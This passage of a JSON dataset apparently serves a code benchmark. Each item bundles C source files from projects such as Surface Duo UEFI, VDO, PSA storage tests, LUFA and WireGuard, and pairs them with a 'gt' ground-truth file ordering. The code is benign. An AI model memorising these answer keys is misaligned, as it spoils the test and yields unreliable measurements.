            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/PlatformConfigurationMapLib.h'",
            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/ConfigurationMapHelperLib.h'",
            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Library/ConfigurationMapHelperLib/ConfigurationMapHelperLib.c'"
        ],
        "content": "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/PlatformConfigurationMapLib.h'\n:#ifndef _PLATFORM_CONFIGURATION_MAP_LIB_H_\n#define _PLATFORM_CONFIGURATION_MAP_LIB_H_\n\n#include <PiPei.h>\n#include <Library/ArmLib.h>\n\n#define CONFIGURATION_NAME_MAX_LENGTH 64\n\ntypedef struct {\n  CHAR8                        Name[CONFIGURATION_NAME_MAX_LENGTH];\n  UINT64                       Value;\n} CONFIGURATION_DESCRIPTOR_EX, *PCONFIGURATION_DESCRIPTOR_EX;\n\nCONFIGURATION_DESCRIPTOR_EX* GetPlatformConfigurationMap();\n\n#endif\n'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/ConfigurationMapHelperLib.h'\n:#ifndef _CONFIGURATION_MAP_HELPER_LIB_H_\n#define _CONFIGURATION_MAP_HELPER_LIB_H_\n\n#include <Library/PlatformConfigurationMapLib.h>\n\nEFI_STATUS EFIAPI LocateConfigurationMapUINT32ByName(\n    CHAR8  *ConfigurationMapUINT32Name,\n    UINT32 *ConfigurationDescriptor);\n\nEFI_STATUS EFIAPI LocateConfigurationMapUINT64ByName(\n    CHAR8  *ConfigurationMapUINT64Name,\n    UINT64 *ConfigurationDescriptor);\n\n#endif\n'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Library/ConfigurationMapHelperLib/ConfigurationMapHelperLib.c'\n:#include <PiPei.h>\n#include <Library/ArmLib.h>\n#include <Library/BaseLib.h>\n#include <Library/ConfigurationMapHelperLib.h>\n#include <Library/HobLib.h>\n#include <Library/PlatformHobs.h>\n#include <Library/ShLib.h>\n#include <Library/UefiCfgLib.h>\n\nEFI_STATUS EFIAPI LocateConfigurationMapUINT32ByName(CHAR8 *Key, UINT32 *Value)\n{\n  UefiCfgLibType *UefiCfgLib = NULL;\n\n  if (EFI_ERROR(GetUefiCfgLib(&UefiCfgLib)) || UefiCfgLib == NULL) {\n    return EFI_NOT_READY;\n  }\n\n  return UefiCfgLib->CfgGetCfgInfoVal(Key, Value);\n}\n\nEFI_STATUS EFIAPI LocateConfigurationMapUINT64ByName(CHAR8 *Key, UINT64 *Value)\n{\n  UefiCfgLibType *UefiCfgLib = NULL;\n\n  if (EFI_ERROR(GetUefiCfgLib(&UefiCfgLib)) || UefiCfgLib == NULL) {\n    return EFI_NOT_READY;\n  }\n\n  return UefiCfgLib->CfgGetCfgInfoVal64(Key, Value);\n}",
        "gt": [
            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/PlatformConfigurationMapLib.h'",
            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Include/Library/ConfigurationMapHelperLib.h'",
            "'mu_andromeda_platforms/Platforms/SurfaceDuoFamilyPkg/Library/ConfigurationMapHelperLib/ConfigurationMapHelperLib.c'"
        ]
    },
    {
        "files": [
            "'vdo/utils/uds/minisyslog.h'",
            "'vdo/utils/uds/logger.h'",
            "'vdo/utils/uds/dm-bufio.c'"
        ],
        "content": "'vdo/utils/uds/minisyslog.h'\n:\n\n#ifndef MINISYSLOG_H\n#define MINISYSLOG_H\n\n#include <linux/compiler_attributes.h>\n\n#include <syslog.h>\n#include <stdarg.h>\n\n\n\n\nvoid mini_openlog(const char *ident, int option, int facility);\n\n\nvoid mini_syslog(int priority, const char *format, ...)\n\t__printf(2, 3);\n\n\nvoid mini_vsyslog(int priority, const char *format, va_list ap)\n\t__printf(2, 0);\n\n\nvoid mini_syslog_pack(int priority,\n\t\t      const char *prefix,\n\t\t      const char *fmt1,\n\t\t      va_list args1,\n\t\t      const char *fmt2,\n\t\t      va_list args2)\n\t__printf(3, 0) __printf(5, 0);\n\n\nvoid mini_closelog(void);\n\n#endif\n\n'vdo/utils/uds/logger.h'\n:\n\n\n#ifndef VDO_LOGGER_H\n#define VDO_LOGGER_H\n\n#include <stdarg.h>\n#include \"minisyslog.h\"\n\n\n\n#define VDO_LOG_EMERG LOG_EMERG\n#define VDO_LOG_ALERT LOG_ALERT\n#define VDO_LOG_CRIT LOG_CRIT\n#define VDO_LOG_ERR LOG_ERR\n#define VDO_LOG_WARNING LOG_WARNING\n#define VDO_LOG_NOTICE LOG_NOTICE\n#define VDO_LOG_INFO LOG_INFO\n#define VDO_LOG_DEBUG LOG_DEBUG\n\n#define VDO_LOGGING_MODULE_NAME \"vdo\"\n\n\n#define vdo_log_ratelimit(log_fn, ...) log_fn(__VA_ARGS__)\n\nint vdo_get_log_level(void);\n\nint vdo_log_string_to_priority(const char *string);\n\nconst char *vdo_log_priority_to_string(int priority);\n\nvoid vdo_log_embedded_message(int priority, const char *module, const char *prefix,\n\t\t\t      const char *fmt1, va_list args1, const char *fmt2, ...)\n\t__printf(4, 0) __printf(6, 7);\n\nvoid vdo_log_backtrace(int priority);\n\n\n\n#define vdo_log_strerror(priority, errnum, ...) \\\n\t__vdo_log_strerror(priority, errnum, VDO_LOGGING_MODULE_NAME, __VA_ARGS__)\n\nint __vdo_log_strerror(int priority, int errnum, const char *module,\n\t\t       const char *format, ...)\n\t__printf(4, 5);\n\nint vdo_vlog_strerror(int priority, int errnum, const char *module, const char *format,\n\t\t      va_list args)\n\t__printf(4, 0);\n\n\n#define vdo_log_error_strerror(errnum, ...) \\\n\tvdo_log_strerror(VDO_LOG_ERR, errnum, __VA_ARGS__)\n\n#define vdo_log_debug_strerror(errnum, ...) \\\n\tvdo_log_strerror(VDO_LOG_DEBUG, errnum, __VA_ARGS__)\n\n#define vdo_log_info_strerror(errnum, ...) \\\n\tvdo_log_strerror(VDO_LOG_INFO, errnum, __VA_ARGS__)\n\n#define vdo_log_warning_strerror(errnum, ...) \\\n\tvdo_log_strerror(VDO_LOG_WARNING, errnum, __VA_ARGS__)\n\n#define vdo_log_fatal_strerror(errnum, ...) \\\n\tvdo_log_strerror(VDO_LOG_CRIT, errnum, __VA_ARGS__)\n\nvoid vdo_log_message(int priority, const char *format, ...)\n\t__printf(2, 3);\n\n#define vdo_log_debug(...) vdo_log_message(VDO_LOG_DEBUG, __VA_ARGS__)\n\n#define vdo_log_info(...) vdo_log_message(VDO_LOG_INFO, __VA_ARGS__)\n\n#define vdo_log_warning(...) vdo_log_message(VDO_LOG_WARNING, __VA_ARGS__)\n\n#define vdo_log_error(...) vdo_log_message(VDO_LOG_ERR, __VA_ARGS__)\n\n#define vdo_log_fatal(...) vdo_log_message(VDO_LOG_CRIT, __VA_ARGS__)\n\nvoid vdo_pause_for_logger(void);\n\nvoid open_vdo_logger(void);\n#endif\n\n'vdo/utils/uds/dm-bufio.c'\n:\n\n\n#include <linux/dm-bufio.h>\n\n#include <linux/blkdev.h>\n#include <linux/err.h>\n\n#include \"fileUtils.h\"\n#include \"logger.h\"\n#include \"memory-alloc.h\"\n#include \"thread-utils.h\"\n\n\n\nstruct dm_buffer;\n\nstruct dm_bufio_client {\n\tint status;\n\tstruct block_device *bdev;\n\toff_t start_offset;\n\tsize_t bytes_per_page;\n\n\tstruct mutex buffer_mutex;\n\tstruct dm_buffer *buffer_list;\n};\n\nstruct dm_buffer {\n\tstruct dm_bufio_client *client;\n\tstruct dm_buffer *next;\n\tsector_t offset;\n\tu8 *data;\n};\n\nstruct dm_bufio_client *\ndm_bufio_client_create(struct block_device *bdev,\n\t\t       unsigned block_size,\n\t\t       unsigned reserved_buffers __always_unused,\n\t\t       unsigned aux_size __always_unused,\n\t\t       void (*alloc_callback)(struct dm_buffer *)\n\t\t       __always_unused,\n\t\t       void (*write_callback)(struct dm_buffer *)\n\t\t       __always_unused,\n\t\t       unsigned int flags __always_unused)\n{\n\tint result;\n\tstruct dm_bufio_client *client;\n\n\tresult = vdo_allocate(1, struct dm_bufio_client, __func__, &client);\n\tif (result != VDO_SUCCESS)\n\t\treturn ERR_PTR(-ENOMEM);\n\n\n\tresult = uds_init_mutex(&client->buffer_mutex);\n\tif (result != UDS_SUCCESS) {\n\t\tdm_bufio_client_destroy(client);\n\t\treturn ERR_PTR(-result);\n\t}\n\n\tclient->bytes_per_page = block_size;\n\tclient->bdev = bdev;\n\treturn client;\n}\n\nvoid dm_bufio_client_destroy(struct dm_bufio_client *client)\n{\n\tstruct dm_buffer *buffer;\n\n\twhile (client->buffer_list != NULL) {\n\t\tbuffer = client->buffer_list;\n\t\tclient->buffer_list = buffer->next;\n\t\tvdo_free(buffer->data);\n\t\tvdo_free(buffer);\n\t}\n\n\tuds_destroy_mutex(&client->buffer_mutex);\n\tvdo_free(client);\n}\n\nvoid dm_bufio_set_sector_offset(struct dm_bufio_client *client, sector_t start)\n{\n\tclient->start_offset = start * SECTOR_SIZE;\n}\n\nvoid *dm_bufio_new(struct dm_bufio_client *client,\n\t\t   sector_t block,\n\t\t   struct dm_buffer **buffer_ptr)\n{\n\tint result;\n\tstruct dm_buffer *buffer = NULL;\n\toff_t block_offset = block * client->bytes_per_page;\n\n\tuds_lock_mutex(&client->buffer_mutex);\n\tif (client->buffer_list != NULL) {\n\t\tbuffer = client->buffer_list;\n\t\tclient->buffer_list = buffer->next;\n\t}\n\tuds_unlock_mutex(&client->buffer_mutex);\n\n\tif (buffer == NULL) {\n\t\tresult = vdo_allocate(1, struct dm_buffer, __func__, &buffer);\n\t\tif (result != VDO_SUCCESS)\n\t\t\treturn ERR_PTR(-ENOMEM);\n\n\t\tresult = vdo_allocate(client->bytes_per_page,\n\t\t\t\t      u8,\n\t\t\t\t      __func__,\n\t\t\t\t      &buffer->data);\n\t\tif (result != VDO_SUCCESS) {\n\t\t\tvdo_free(buffer);\n\t\t\treturn ERR_PTR(-ENOMEM);\n\t\t}\n\n\t\tbuffer->client = client;\n\t}\n\n\tbuffer->offset = client->start_offset + block_offset;\n\t*buffer_ptr = buffer;\n\treturn buffer->data;\n}\n\n\nvoid *dm_bufio_read(struct dm_bufio_client *client,\n\t\t    sector_t block,\n\t\t    struct dm_buffer **buffer_ptr)\n{\n\tint result;\n\tsize_t read_length = 0;\n\tstruct dm_buffer *buffer;\n\tu8 *data;\n\n\tdata = dm_bufio_new(client, block, &buffer);\n\tif (IS_ERR(data)) {\n\t\tvdo_log_error_strerror(-PTR_ERR(data),\n\t\t\t\t       \"error reading physical page %lu\",\n\t\t\t\t       block);\n\t\treturn data;\n\t}\n\n\tresult = read_data_at_offset(client->bdev->fd,\n\t\t\t\t     buffer->offset,\n\t\t\t\t     buffer->data,\n\t\t\t\t     client->bytes_per_page,\n\t\t\t\t     &read_length);\n\tif (result != UDS_SUCCESS) {\n\t\tdm_bufio_release(buffer);\n\t\tvdo_log_warning_strerror(result,\n\t\t\t\t\t \"error reading physical page %lu\",\n\t\t\t\t\t block);\n\t\treturn ERR_PTR(-EIO);\n\t}\n\n\tif (read_length < client->bytes_per_page)\n\t\tmemset(&buffer->data[read_length],\n\t\t       0,\n\t\t       client->bytes_per_page - read_length);\n\n\t*buffer_ptr = buffer;\n\treturn buffer->data;\n}\n\nvoid dm_bufio_prefetch(struct dm_bufio_client *client __always_unused,\n\t\t       sector_t block __always_unused,\n\t\t       unsigned block_count __always_unused)\n{\n\n}\n\nvoid dm_bufio_release(struct dm_buffer *buffer)\n{\n\tstruct dm_bufio_client *client = buffer->client;\n\n\tuds_lock_mutex(&client->buffer_mutex);\n\tbuffer->next = client->buffer_list;\n\tclient->buffer_list = buffer;\n\tuds_unlock_mutex(&client->buffer_mutex);\n}\n\n\nvoid dm_bufio_release_move(struct dm_buffer *buffer, sector_t new_block)\n{\n\tstruct dm_bufio_client *client = buffer->client;\n\toff_t block_offset = new_block * client->bytes_per_page;\n\n\tbuffer->offset = client->start_offset + block_offset;\n}\n\n\nvoid dm_bufio_mark_buffer_dirty(struct dm_buffer *buffer)\n{\n\tint result;\n\tstruct dm_bufio_client *client = buffer->client;\n\n\tresult = write_buffer_at_offset(client->bdev->fd,\n\t\t\t\t\tbuffer->offset,\n\t\t\t\t\tbuffer->data,\n\t\t\t\t\tclient->bytes_per_page);\n\tif (client->status == UDS_SUCCESS)\n\t\tclient->status = result;\n}\n\n\nint dm_bufio_write_dirty_buffers(struct dm_bufio_client *client)\n{\n\tif (client->status != UDS_SUCCESS)\n\t\treturn -client->status;\n\n\treturn -logging_fsync(client->bdev->fd, \"cannot sync file contents\");\n}\n\nvoid *dm_bufio_get_block_data(struct dm_buffer *buffer)\n{\n\treturn buffer->data;\n}\n",
        "gt": [
            "'vdo/utils/uds/minisyslog.h'",
            "'vdo/utils/uds/logger.h'",
            "'vdo/utils/uds/dm-bufio.c'"
        ]
    },
    {
        "files": [
            "'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_s004.h'",
            "'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_data.h'",
            "'psa-arch-tests/api-tests/dev_apis/storage/common/test_storage_common.h'"
        ],
        "content": "'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_s004.h'\n:\n#ifndef _TEST_S004_CLIENT_TESTS_H_\n#define _TEST_S004_CLIENT_TESTS_H_\n\n#define test_entry CONCAT(test_entry_,  s004)\n\n#include \"test_storage_common.h\"\n\nextern const client_test_t s004_storage_test_list[];\n\nint32_t s004_storage_test(caller_security_t caller);\n\n#endif\n\n'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_data.h'\n:\n#ifndef _S004_TEST_DATA_H_\n#define _S004_TEST_DATA_H_\n\n#include \"test_s004.h\"\n\nstatic const test_data_t s004_data[] = {\n{\n    VAL_TEST_IDX0, {VAL_API_UNUSED, VAL_API_UNUSED}, 0\n},\n{\n\n    VAL_TEST_IDX1, {VAL_ITS_SET, VAL_PS_SET}, PSA_SUCCESS\n},\n{\n\n    VAL_TEST_IDX2, {VAL_ITS_GET, VAL_PS_GET}, PSA_SUCCESS\n},\n{\n    VAL_TEST_IDX3, {VAL_API_UNUSED, VAL_API_UNUSED}, 0\n},\n{\n\n    VAL_TEST_IDX4, {VAL_ITS_SET, VAL_PS_SET}, PSA_SUCCESS\n},\n{\n\n    VAL_TEST_IDX5, {VAL_ITS_GET, VAL_PS_GET}, PSA_SUCCESS\n},\n{\n    VAL_TEST_IDX6, {VAL_API_UNUSED, VAL_API_UNUSED}, 0\n},\n{\n\n    VAL_TEST_IDX7, {VAL_ITS_REMOVE, VAL_PS_REMOVE}, PSA_SUCCESS\n},\n};\n#endif\n\n'psa-arch-tests/api-tests/dev_apis/storage/common/test_storage_common.h'\n:\n#ifndef _TEST_STORAGE_COMMON_H_\n#define _TEST_STORAGE_COMMON_H_\n\n#include \"val_storage.h\"\n#include \"val_interfaces.h\"\n\n#define val              CONCAT(val, test_entry)\n#define psa              CONCAT(psa, test_entry)\n#define STORAGE_FUNCTION val->storage_function\n#define ITS_TEST_MESSAGE \"\\n[Info] Executing ITS tests\\n\"\n#define PS_TEST_MESSAGE  \"\\n[Info] Executing PS tests\\n\"\n#define TEST_DESC_STORAGE \" | UT: STORAGE\\n\"\n#define TEST_DESC_ITS \" | UT: ITS\\n\"\n#define TEST_DESC_PS \" | UT: PS\\n\"\n\nextern val_api_t           *val;\nextern psa_api_t           *psa;\n\ntypedef struct {\n    val_test_index_t        idx;\n    storage_function_type_t api[2];\n    psa_status_t            status;\n} test_data_t;\n\nextern int32_t storage_buffer_comparison(uint8_t *buffer_to_compare, uint32_t test_buff_size);\n\n#endif\n",
        "gt": [
            "'psa-arch-tests/api-tests/dev_apis/storage/common/test_storage_common.h'",
            "'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_s004.h'",
            "'psa-arch-tests/api-tests/dev_apis/storage/test_s004/test_data.h'"
        ]
    },
    {
        "files": [
            "'EasyAVR/firmware/src/LUFA/LUFA/Common/Common.h'",
            "'EasyAVR/firmware/src/ASF/common/boards/user_board/init.c'",
            "'EasyAVR/firmware/src/asf.h'"
        ],
        "content": "'EasyAVR/firmware/src/LUFA/LUFA/Common/Common.h'\n:\n\n\n\n\n\n\n\n\n\n\n\n#ifndef __LUFA_COMMON_H__\n#define __LUFA_COMMON_H__\n\n\n\t\t#define __INCLUDE_FROM_COMMON_H\n\n\n\t\t#include <stdint.h>\n\t\t#include <stdbool.h>\n\t\t#include <string.h>\n\t\t#include <stddef.h>\n\n\t\t#include \"Architectures.h\"\n\t\t#include \"BoardTypes.h\"\n\t\t#include \"ArchitectureSpecific.h\"\n\t\t#include \"CompilerSpecific.h\"\n\t\t#include \"Attributes.h\"\n\n\t\t#if defined(USE_LUFA_CONFIG_HEADER)\n\t\t\t#include \"LUFAConfig.h\"\n\t\t#endif\n\n\n\t\t#if defined(__cplusplus)\n\t\t\textern \"C\" {\n\t\t#endif\n\n\n\t\t#if defined(__DOXYGEN__)\n\n\t\t\ttypedef MACHINE_REG_t uint_reg_t;\n\t\t#elif (ARCH == ARCH_AVR8)\n\t\t\t#include <avr/io.h>\n\t\t\t#include <avr/interrupt.h>\n\t\t\t#include <avr/pgmspace.h>\n\t\t\t#include <avr/eeprom.h>\n\t\t\t#include <avr/boot.h>\n\t\t\t#include <math.h>\n\t\t\t#include <util/delay.h>\n\n\t\t\ttypedef uint8_t uint_reg_t;\n\n\t\t\t#define ARCH_HAS_EEPROM_ADDRESS_SPACE\n\t\t\t#define ARCH_HAS_FLASH_ADDRESS_SPACE\n\t\t\t#define ARCH_HAS_MULTI_ADDRESS_SPACE\n\t\t\t#define ARCH_LITTLE_ENDIAN\n\n\t\t\t#include \"Endianness.h\"\n\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t#include <avr32/io.h>\n\t\t\t#include <math.h>\n\n\n\t\t\t#define PROGMEM\n\t\t\t#define pgm_read_byte(x)         *x\n\t\t\t#define memcmp_P(...)            memcmp(__VA_ARGS__)\n\t\t\t#define memcpy_P(...)            memcpy(__VA_ARGS__)\n\n\n\t\t\ttypedef uint32_t uint_reg_t;\n\n\t\t\t#define ARCH_BIG_ENDIAN\n\n\t\t\t#include \"Endianness.h\"\n\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t#include <avr/io.h>\n\t\t\t#include <avr/interrupt.h>\n\t\t\t#include <avr/pgmspace.h>\n\t\t\t#include <avr/eeprom.h>\n\t\t\t#include <math.h>\n\t\t\t#include <util/delay.h>\n\n\t\t\ttypedef uint8_t uint_reg_t;\n\n\t\t\t#define ARCH_HAS_EEPROM_ADDRESS_SPACE\n\t\t\t#define ARCH_HAS_FLASH_ADDRESS_SPACE\n\t\t\t#define ARCH_HAS_MULTI_ADDRESS_SPACE\n\t\t\t#define ARCH_LITTLE_ENDIAN\n\n\t\t\t#include \"Endianness.h\"\n\t\t#else\n\t\t\t#error Unknown device architecture specified.\n\t\t#endif\n\n\n\n\t\t\t#if !defined(__DOXYGEN__)\n\n\t\t\t\t#define MACROS                  do\n\t\t\t\t#define MACROE                  while (0)\n\t\t\t#endif\n\n\n\t\t\t#if !defined(MAX) || defined(__DOXYGEN__)\n\t\t\t\t#define MAX(x, y)               (((x) > (y)) ? (x) : (y))\n\t\t\t#endif\n\n\n\t\t\t#if !defined(MIN) || defined(__DOXYGEN__)\n\t\t\t\t#define MIN(x, y)               (((x) < (y)) ? (x) : (y))\n\t\t\t#endif\n\n\t\t\t#if !defined(STRINGIFY) || defined(__DOXYGEN__)\n\n\t\t\t\t#define STRINGIFY(x)            #x\n\n\n\t\t\t\t#define STRINGIFY_EXPANDED(x)   STRINGIFY(x)\n\t\t\t#endif\n\n\t\t\t#if !defined(CONCAT) || defined(__DOXYGEN__)\n\n\t\t\t\t#define CONCAT(x, y)            x ## y\n\n\n\t\t\t\t#define CONCAT_EXPANDED(x, y)   CONCAT(x, y)\n\t\t\t#endif\n\n\t\t\t#if !defined(ISR) || defined(__DOXYGEN__)\n\n\t\t\t\t#define ISR(Name, ...)          void Name (void) __attribute__((__interrupt__)) __VA_ARGS__; void Name (void)\n\t\t\t#endif\n\n\n\n\t\t\tstatic inline uint8_t BitReverse(uint8_t Byte) ATTR_WARN_UNUSED_RESULT ATTR_CONST;\n\t\t\tstatic inline uint8_t BitReverse(uint8_t Byte)\n\t\t\t{\n\t\t\t\tByte = (((Byte & 0xF0) >> 4) | ((Byte & 0x0F) << 4));\n\t\t\t\tByte = (((Byte & 0xCC) >> 2) | ((Byte & 0x33) << 2));\n\t\t\t\tByte = (((Byte & 0xAA) >> 1) | ((Byte & 0x55) << 1));\n\n\t\t\t\treturn Byte;\n\t\t\t}\n\n\n\t\t\tstatic inline void Delay_MS(uint16_t Milliseconds) ATTR_ALWAYS_INLINE;\n\t\t\tstatic inline void Delay_MS(uint16_t Milliseconds)\n\t\t\t{\n\t\t\t\t#if (ARCH == ARCH_AVR8)\n\t\t\t\tif (GCC_IS_COMPILE_CONST(Milliseconds))\n\t\t\t\t{\n\t\t\t\t\t_delay_ms(Milliseconds);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\twhile (Milliseconds--)\n\t\t\t\t\t  _delay_ms(1);\n\t\t\t\t}\n\t\t\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t\twhile (Milliseconds--)\n\t\t\t\t{\n\t\t\t\t\t__builtin_mtsr(AVR32_COUNT, 0);\n\t\t\t\t\twhile ((uint32_t)__builtin_mfsr(AVR32_COUNT) < (F_CPU / 1000));\n\t\t\t\t}\n\t\t\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t\tif (GCC_IS_COMPILE_CONST(Milliseconds))\n\t\t\t\t{\n\t\t\t\t\t_delay_ms(Milliseconds);\n\t\t\t\t}\n\t\t\t\telse\n\t\t\t\t{\n\t\t\t\t\twhile (Milliseconds--)\n\t\t\t\t\t  _delay_ms(1);\n\t\t\t\t}\n\t\t\t\t#endif\n\t\t\t}\n\n\n\t\t\tstatic inline uint_reg_t GetGlobalInterruptMask(void) ATTR_ALWAYS_INLINE ATTR_WARN_UNUSED_RESULT;\n\t\t\tstatic inline uint_reg_t GetGlobalInterruptMask(void)\n\t\t\t{\n\t\t\t\tGCC_MEMORY_BARRIER();\n\n\t\t\t\t#if (ARCH == ARCH_AVR8)\n\t\t\t\treturn SREG;\n\t\t\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t\treturn __builtin_mfsr(AVR32_SR);\n\t\t\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t\treturn SREG;\n\t\t\t\t#endif\n\t\t\t}\n\n\n\t\t\tstatic inline void SetGlobalInterruptMask(const uint_reg_t GlobalIntState) ATTR_ALWAYS_INLINE;\n\t\t\tstatic inline void SetGlobalInterruptMask(const uint_reg_t GlobalIntState)\n\t\t\t{\n\t\t\t\tGCC_MEMORY_BARRIER();\n\n\t\t\t\t#if (ARCH == ARCH_AVR8)\n\t\t\t\tSREG = GlobalIntState;\n\t\t\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t\tif (GlobalIntState & AVR32_SR_GM)\n\t\t\t\t  __builtin_ssrf(AVR32_SR_GM_OFFSET);\n\t\t\t\telse\n\t\t\t\t  __builtin_csrf(AVR32_SR_GM_OFFSET);\n\t\t\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t\tSREG = GlobalIntState;\n\t\t\t\t#endif\n\n\t\t\t\tGCC_MEMORY_BARRIER();\n\t\t\t}\n\n\n\t\t\tstatic inline void GlobalInterruptEnable(void) ATTR_ALWAYS_INLINE;\n\t\t\tstatic inline void GlobalInterruptEnable(void)\n\t\t\t{\n\t\t\t\tGCC_MEMORY_BARRIER();\n\n\t\t\t\t#if (ARCH == ARCH_AVR8)\n\t\t\t\tsei();\n\t\t\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t\t__builtin_csrf(AVR32_SR_GM_OFFSET);\n\t\t\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t\tsei();\n\t\t\t\t#endif\n\n\t\t\t\tGCC_MEMORY_BARRIER();\n\t\t\t}\n\n\n\t\t\tstatic inline void GlobalInterruptDisable(void) ATTR_ALWAYS_INLINE;\n\t\t\tstatic inline void GlobalInterruptDisable(void)\n\t\t\t{\n\t\t\t\tGCC_MEMORY_BARRIER();\n\n\t\t\t\t#if (ARCH == ARCH_AVR8)\n\t\t\t\tcli();\n\t\t\t\t#elif (ARCH == ARCH_UC3)\n\t\t\t\t__builtin_ssrf(AVR32_SR_GM_OFFSET);\n\t\t\t\t#elif (ARCH == ARCH_XMEGA)\n\t\t\t\tcli();\n\t\t\t\t#endif\n\n\t\t\t\tGCC_MEMORY_BARRIER();\n\t\t\t}\n\n\n\t\t#if defined(__cplusplus)\n\t\t\t}\n\t\t#endif\n\n#endif\n\n\n\n\n'EasyAVR/firmware/src/ASF/common/boards/user_board/init.c'\n:\n\n\n#include <asf.h>\n#include <board.h>\n#include <conf_board.h>\n\nvoid board_init(void)\n{\n\n}\n\n'EasyAVR/firmware/src/asf.h'\n:\n\n#ifndef ASF_H\n#define ASF_H\n\n\n\n\n#include <user_board.h>\n\n\n#include <board.h>\n\n\n#include <interrupt.h>\n\n\n#include <LUFA/Common/Common.h>\n#include <LUFA/Version.h>\n\n\n#include <LUFA/Drivers/USB/USB.h>\n\n\n#include <compiler.h>\n#include <status_codes.h>\n\n\n#include <parts.h>\n\n#endif\n",
        "gt": [
            "'EasyAVR/firmware/src/LUFA/LUFA/Common/Common.h'",
            "'EasyAVR/firmware/src/asf.h'",
            "'EasyAVR/firmware/src/ASF/common/boards/user_board/init.c'"
        ]
    },
    {
        "files": [
            "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'",
            "'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'",
            "'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'",
            "'wireguard-linux-compat/src/compat/fpu-x86/include/asm/fpu/api.h'",
            "'wireguard-linux-compat/src/crypto/zinc/poly1305/poly1305.c'"
        ],
        "content": "'wireguard-linux-compat/src/compat/simd/include/linux/simd.h'\n:\n\n\n#ifndef _WG_SIMD_H\n#define _WG_SIMD_H\n\n#include <linux/sched.h>\n#include <asm/simd.h>\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n#include <asm/neon.h>\n#endif\n\ntypedef enum {\n\tHAVE_NO_SIMD = 1 << 0,\n\tHAVE_FULL_SIMD = 1 << 1,\n\tHAVE_SIMD_IN_USE = 1 << 31\n} simd_context_t;\n\n#define DONT_USE_SIMD ((simd_context_t []){ HAVE_NO_SIMD })\n\nstatic inline void simd_get(simd_context_t *ctx)\n{\n\t*ctx = !IS_ENABLED(CONFIG_PREEMPT_RT) && !IS_ENABLED(CONFIG_PREEMPT_RT_BASE) && may_use_simd() ? HAVE_FULL_SIMD : HAVE_NO_SIMD;\n}\n\nstatic inline void simd_put(simd_context_t *ctx)\n{\n#if defined(CONFIG_X86_64)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_fpu_end();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\tkernel_neon_end();\n#endif\n\t*ctx = HAVE_NO_SIMD;\n}\n\nstatic inline bool simd_relax(simd_context_t *ctx)\n{\n#ifdef CONFIG_PREEMPT\n\tif ((*ctx & HAVE_SIMD_IN_USE) && need_resched()) {\n\t\tsimd_put(ctx);\n\t\tsimd_get(ctx);\n\t\treturn true;\n\t}\n#endif\n\treturn false;\n}\n\nstatic __must_check inline bool simd_use(simd_context_t *ctx)\n{\n\tif (!(*ctx & HAVE_FULL_SIMD))\n\t\treturn false;\n\tif (*ctx & HAVE_SIMD_IN_USE)\n\t\treturn true;\n#if defined(CONFIG_X86_64)\n\tkernel_fpu_begin();\n#elif defined(CONFIG_KERNEL_MODE_NEON)\n\tkernel_neon_begin();\n#endif\n\t*ctx |= HAVE_SIMD_IN_USE;\n\treturn true;\n}\n\n#endif\n\n'wireguard-linux-compat/src/crypto/include/zinc/poly1305.h'\n:\n\n\n#ifndef _ZINC_POLY1305_H\n#define _ZINC_POLY1305_H\n\n#include <linux/simd.h>\n#include <linux/types.h>\n\nenum poly1305_lengths {\n\tPOLY1305_BLOCK_SIZE = 16,\n\tPOLY1305_KEY_SIZE = 32,\n\tPOLY1305_MAC_SIZE = 16\n};\n\nstruct poly1305_ctx {\n\tu8 opaque[24 * sizeof(u64)];\n\tu32 nonce[4];\n\tu8 data[POLY1305_BLOCK_SIZE];\n\tsize_t num;\n} __aligned(8);\n\nvoid poly1305_init(struct poly1305_ctx *ctx, const u8 key[POLY1305_KEY_SIZE]);\nvoid poly1305_update(struct poly1305_ctx *ctx, const u8 *input, size_t len,\n\t\t     simd_context_t *simd_context);\nvoid poly1305_final(struct poly1305_ctx *ctx, u8 mac[POLY1305_MAC_SIZE],\n\t\t    simd_context_t *simd_context);\n\n#endif\n\n'wireguard-linux-compat/src/compat/simd-asm/include/asm/simd.h'\n:#ifndef _COMPAT_ASM_SIMD_H\n#define _COMPAT_ASM_SIMD_H\n\n#if defined(CONFIG_X86_64)\n#include <asm/fpu/api.h>\n#endif\n\nstatic __must_check inline bool may_use_simd(void)\n{\n#if defined(CONFIG_X86_64)\n\treturn irq_fpu_usable();\n#elif defined(CONFIG_ARM64) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn true;\n#elif defined(CONFIG_ARM) && defined(CONFIG_KERNEL_MODE_NEON)\n\treturn !in_nmi() && !in_irq() && !in_serving_softirq();\n#else\n\treturn 